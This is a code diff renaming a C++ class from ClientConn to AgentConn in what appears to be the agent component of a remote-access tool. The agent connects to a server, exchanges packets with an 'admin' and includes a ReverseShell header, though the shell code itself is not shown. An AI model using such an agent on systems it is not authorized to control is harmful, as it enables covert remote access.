@@ -1,25 +1,25 @@
 #include <iostream>
 #include <csignal>
-#include "conn/ClientConn.h"
+#include "conn/AgentConn.h"
 #include "protocol/SocketUtil.h"
 #include "protocol/ProtocolDebug.h"
 #include "remote_accsess/ReverseShell.h"
 #include "protocol/PacketData.h"
 
-ClientConn::ClientConn(const char *ip, int port) {
+AgentConn::AgentConn(const char *ip, int port) {
     clientSocketFD = createTCPIPv4Socket();
     serverAddress = createIPv4Address(ip, port);
     localAddress = createIPv4Address(clientSocketFD);
 };
 
-int ClientConn::main() {
+int AgentConn::main() {
     connectToServer();
     send();
     receive();
     return 0;
 };
 
-void ClientConn::connectToServer() {
+void AgentConn::connectToServer() {
     int result = connect(clientSocketFD, (sockaddr *) serverAddress, sizeof(struct sockaddr_in));
     if (result == 0) {
         Packet packet(CONNECT, localAddress, serverAddress);
@@ -33,7 +33,7 @@ void ClientConn::connectToServer() {
 };
 
 
-void ClientConn::receive() {
+void AgentConn::receive() {
     while (true) {
         Packet packet;
         int status = recvPacket(clientSocketFD, &packet);;
@@ -45,7 +45,7 @@ void ClientConn::receive() {
     }
 };
 
-void ClientConn::handlePacket(Packet packet) {
+void AgentConn::handlePacket(Packet packet) {
     switch (packet.getType()) {
         case (MSG):
             handleMsg(packet);
@@ -60,7 +60,7 @@ void ClientConn::handlePacket(Packet packet) {
 }
 
 
-void ClientConn::handleMsg(Packet packet) {
+void AgentConn::handleMsg(Packet packet) {
     switchPacketSrcDst(packet);
     sendPacket(clientSocketFD,packet);
     printf("sent to admin\n");
@@ -68,7 +68,7 @@ void ClientConn::handleMsg(Packet packet) {
 
 
 
-void ClientConn::send() {
+void AgentConn::send() {
     char msg[]{"hello from client :)"};
     MsgData msgData(msg);
     Packet p1(MSG, createIPv4Address(clientSocketFD), serverAddress, msgData.serialized(), msgData.dataLength);
